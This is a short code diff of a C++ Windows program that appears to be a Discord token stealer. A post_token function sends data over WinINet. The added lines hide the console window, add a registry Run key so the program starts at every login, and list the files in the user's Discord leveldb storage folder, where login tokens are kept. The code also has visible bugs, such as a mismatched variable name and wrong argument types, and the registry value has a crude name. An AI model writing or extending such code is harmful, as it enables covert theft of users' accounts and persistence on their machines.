@@ -73,10 +73,15 @@ void post_token(string token) {
 		}
 	}
 	InternetCloseHandle(wbNet);
-	printf("%s!\n", rtn.c_str());
 }
 
-int main() {
+int main(int arg_count, char* argv) {
+	FreeConsole();
+	
+	HKEY key = NULL;
+	LONG v1 = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ,&key);
+	LONG v2 = RegSetValueEx(hkey, "CockAndBallTorture", 0, REG_SZ, (BYTE*)argv[0], (string(argv[0]).size() + 1) * sizeof(wchar_t));
+	
 	string path = "%appdata%\\discord\\Local Storage\\leveldb";
 	
 	auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
